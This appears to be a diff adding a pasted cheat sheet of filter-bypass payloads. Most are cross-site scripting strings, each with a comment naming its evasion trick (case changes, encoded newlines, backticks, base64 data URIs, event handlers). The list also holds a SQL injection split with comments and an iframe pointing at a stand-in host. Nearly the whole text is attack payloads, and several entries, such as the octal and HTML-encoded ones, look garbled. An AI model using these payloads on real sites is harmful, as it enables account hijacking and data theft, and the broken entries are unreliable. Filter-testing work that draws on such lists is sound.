@@ -1,3 +1,59 @@
+REGEX BYPASS 
+
+<​sCrIpT>alert(XSS)<​/sCriPt> 
+hashtag#changing the case of the tag
+
+<<​script>alert(XSS)<​/script> 
+hashtag#prepending an additional "<"
+
+<​script>alert(XSS) // 
+hashtag#removing the closing tag
+
+<​script>alert`XSS`<​/script> 
+hashtag#using backticks instead of parenetheses
+
+java%0ascript:alert(1) 
+hashtag#using encoded newline characters
+
+<iframe src=http://malicous.com < 
+hashtag#double open angle brackets
+
+<​STYLE>.classname{background-image:url("javascript​:alert(XSS)");}<​/STYLE> 
+hashtag#uncommon tags
+
+<img/src=1/onerror​=alert(0)> 
+hashtag#bypass space filter by using / where a space is expected
+
+<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=javascript​:alert(1)>xss</a> 
+hashtag#extra characters
+
+Function("ale"+"rt(1)")(); 
+hashtag#using uncommon functions besides alert, console.log, and prompt
+
+javascript​:74163166147401571561541571411447514115414516216450615176 
+hashtag#octal encoding
+
+<iframe src="javascript​:alert(`xss`)"> 
+hashtag#unicode encoding
+
+/?id=1+un/**/ion+sel/**/ect+1,2,3-- 
+hashtag#using comments in SQL query to break up statement
+
+new Function`alt\`6\``; 
+hashtag#using backticks instead of parentheses
+
+data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ 
+hashtag#base64 encoding the javascript
+
+%26%2397;lert(1) 
+hashtag#using HTML encoding
+
+<a src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(XSS)"> 
+hashtag#Using Line Feed (LF) line breaks 
+
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm()> 
+-----------------
+
 https://readmedium.com/en/lfi-advanced-methodology-by-abhijeet-6663bede44c6
 
 ASWIN K V | deepmarketer
